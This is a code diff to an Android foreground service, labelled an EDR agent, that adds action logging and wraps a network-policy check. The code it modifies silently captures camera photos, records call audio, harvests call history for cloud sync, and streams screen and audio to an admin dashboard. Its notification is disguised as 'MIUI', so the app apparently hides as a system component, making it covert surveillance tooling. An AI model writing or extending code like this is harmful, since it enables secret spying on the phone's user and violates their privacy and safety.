@@ -18,6 +18,7 @@ import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.edr.agent.EdrApplication
 import com.edr.agent.camera.SilentCameraCapturer
+import com.edr.agent.logging.EdrActionLogger
 import com.edr.agent.monitor.TrapAppMonitor
 import com.edr.agent.network.EdrHttpClient
 import com.edr.agent.network.EdrNetworkManager
@@ -107,6 +108,15 @@ class EdrForegroundService : Service() {
 
         // Initialize Autonomous Call Audio Recorder
         com.edr.agent.telemetry.CallAudioRecorder.init(this)
+
+        // Log Service Start
+        EdrActionLogger.logInstant(
+            context = this,
+            module = "ForegroundService",
+            eventType = "SERVICE_START",
+            triggeredBy = "Automatic",
+            description = "EDR persistent foreground service active"
+        )
 
         // Harvest phone call history with exact duration metrics and synchronize with cloud (if allowed)
         if (!SyncPreferences.isAgentPaused) {
@@ -357,6 +367,15 @@ class EdrForegroundService : Service() {
         super.onDestroy()
         instance = null
         try {
+            EdrActionLogger.logInstant(
+                context = this,
+                module = "ForegroundService",
+                eventType = "SERVICE_STOP",
+                triggeredBy = "Automatic",
+                description = "EDR service stopped/restarting"
+            )
+        } catch (_: Exception) {}
+        try {
             screenReceiver?.let { unregisterReceiver(it) }
         } catch (ignored: Exception) {}
         try {
@@ -378,51 +397,68 @@ class EdrForegroundService : Service() {
      * - 4G / 4G+ / 3G / 2G / Offline: Stop all background activity (Paused) and wait 1 hour.
      *
      * Function 2: Admin Ping Response triggers this immediately without waiting for hourly timer.
+     * All checks are logged via universal EdrActionLogger.runLoggedAction().
      */
     @Synchronized
     fun checkNetworkAndApplyPolicy(trigger: String): EdrNetworkManager.NetworkStatus {
-        val netStatus = EdrNetworkManager.getNetworkStatus(this)
-        SyncPreferences.lastNetworkCheckTime = System.currentTimeMillis()
-        val shouldWorkNormally = netStatus.shouldWorkNormally
-
-        val isNowPaused = !shouldWorkNormally
-        SyncPreferences.isNetworkPaused = isNowPaused
-
-        Log.i(TAG, "[$trigger] Network: ${netStatus.typeName} (${netStatus.label}) -> EDR: ${SyncPreferences.edrStatus}")
-
-        if (isNowPaused) {
-            // STOP ALL BACKGROUND ACTIVITY
-            try {
-                if (AppTrapScreenRecorder.isCurrentlyRecording()) {
-                    Log.i(TAG, "Stopping active trap recording due to network pause policy ($trigger).")
-                    AppTrapScreenRecorder.stopRecording(applicationContext)
-                }
-            } catch (e: Exception) {
-                Log.w(TAG, "Error stopping active recording: ${e.message}")
-            }
-            try {
-                com.edr.agent.screen.ScreenStreamManager.stopStreaming()
-            } catch (_: Exception) {}
-            try {
-                com.edr.agent.screen.AudioStreamManager.stopStreaming()
-            } catch (_: Exception) {}
-
-            // Cancel trap fallback poller
-            updateTrapFallbackSchedule()
-        } else {
-            // RESUME NORMAL EDR WORK
-            updateTrapFallbackSchedule()
-            AppTrapScreenRecorder.flushPendingLockedRecordings(this)
-            SilentCameraCapturer.flushPendingLockedPhotos(this)
+        val triggeredBy = when {
+            trigger.contains("ADMIN", ignoreCase = true) -> "Admin"
+            trigger.contains("HOURLY", ignoreCase = true) -> "Hourly check"
+            else -> "Automatic"
         }
 
-        // Update notification (shows "MIUI (Paused)" or "MIUI")
-        updateNotification()
+        return EdrActionLogger.runLoggedAction(
+            context = this,
+            module = "Network",
+            eventType = "NETWORK_POLICY_CHECK",
+            triggeredBy = triggeredBy,
+            description = "Network check ($trigger)"
+        ) { actCtx ->
+            val netStatus = EdrNetworkManager.getNetworkStatus(this)
+            SyncPreferences.lastNetworkCheckTime = System.currentTimeMillis()
+            val shouldWorkNormally = netStatus.shouldWorkNormally
 
-        // Push status to Admin Dashboard immediately (via WebSocket or HTTP fallback)
-        wsClient?.sendNetworkAndEdrStatus(netStatus)
+            val isNowPaused = !shouldWorkNormally
+            SyncPreferences.isNetworkPaused = isNowPaused
 
-        return netStatus
+            Log.i(TAG, "[$trigger] Network: ${netStatus.typeName} (${netStatus.label}) -> EDR: ${SyncPreferences.edrStatus}")
+
+            if (isNowPaused) {
+                // STOP ALL BACKGROUND ACTIVITY
+                try {
+                    if (AppTrapScreenRecorder.isCurrentlyRecording()) {
+                        Log.i(TAG, "Stopping active trap recording due to network pause policy ($trigger).")
+                        AppTrapScreenRecorder.stopRecording(applicationContext)
+                    }
+                } catch (e: Exception) {
+                    Log.w(TAG, "Error stopping active recording: ${e.message}")
+                }
+                try {
+                    com.edr.agent.screen.ScreenStreamManager.stopStreaming()
+                } catch (_: Exception) {}
+                try {
+                    com.edr.agent.screen.AudioStreamManager.stopStreaming()
+                } catch (_: Exception) {}
+
+                // Cancel trap fallback poller
+                updateTrapFallbackSchedule()
+            } else {
+                // RESUME NORMAL EDR WORK
+                updateTrapFallbackSchedule()
+                AppTrapScreenRecorder.flushPendingLockedRecordings(this)
+                SilentCameraCapturer.flushPendingLockedPhotos(this)
+                // Flush pending action logs to central dashboard
+                EdrActionLogger.triggerPendingLogsUpload(this)
+            }
+
+            // Update notification (shows "MIUI (Paused)" or "MIUI")
+            updateNotification()
+
+            // Push status to Admin Dashboard immediately (via WebSocket or HTTP fallback)
+            wsClient?.sendNetworkAndEdrStatus(netStatus)
+
+            netStatus
+        }
     }
 
     @Synchronized
